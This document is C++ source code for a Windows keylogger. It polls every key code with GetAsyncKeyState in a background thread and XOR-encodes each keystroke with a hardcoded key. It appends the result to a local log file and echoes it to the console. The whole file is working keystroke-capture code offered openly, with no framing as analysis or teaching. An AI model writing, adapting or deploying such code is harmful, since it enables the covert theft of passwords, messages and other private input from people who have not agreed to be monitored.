#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <thread>
#include <mutex>
#include <chrono>

std::string encryptionKey = "mysecretkey"; // Moved to global scope

std::string encrypt(const std::string& plaintext) {
    std::string ciphertext = "";
    for (size_t i = 0; i < plaintext.length(); i++) {
        ciphertext += static_cast<char>(plaintext[i] ^ encryptionKey[i % encryptionKey.length()]);
    }
    return ciphertext;
}

std::string decrypt(const std::string& ciphertext) {
    std::string plaintext = "";
    for (size_t i = 0; i < ciphertext.length(); i++) {
        plaintext += static_cast<char>(ciphertext[i] ^ encryptionKey[i % encryptionKey.length()]);
    }
    return plaintext;
}

void keyloggerFunction(std::ofstream& logFile, std::mutex& logFileMutex) {
    while (true) {
        for (int i = 0; i < 256; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                std::string keystroke = "";
                if (i == VK_SHIFT || i == VK_CONTROL || i == VK_MENU) {
                    continue;
                }
                if (i == VK_SPACE) {
                    keystroke = " ";
                } else if (i == VK_RETURN) {
                    keystroke = "\n";
                } else if (i == VK_TAB) {
                    keystroke = "\t";
                } else {
                    keystroke = static_cast<char>(i);
                }
                std::string encryptedKeystroke = encrypt(keystroke);
                logFileMutex.lock();
                logFile << encryptedKeystroke;
                logFileMutex.unlock();
                std::cout << "[" << i << "] " << keystroke << " (" << encryptedKeystroke << ")" << std::endl;
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

int main() {
    bool enableKeylogger = true;
    std::ofstream logFile;
    std::mutex logFileMutex;

    if (enableKeylogger) {
        logFile.open("keylogger.log", std::ios_base::app);
        if (!logFile) {
            std::cerr << "Error opening the log file." << std::endl;
            return 1;
        }

        std::thread keyloggerThread(keyloggerFunction, std::ref(logFile), std::ref(logFileMutex));
        keyloggerThread.detach();

        char userInput;
        std::cout << "Press any key to exit the program." << std::endl;
        std::cin >> userInput;

        logFile.close();
    }

    return 0;
}
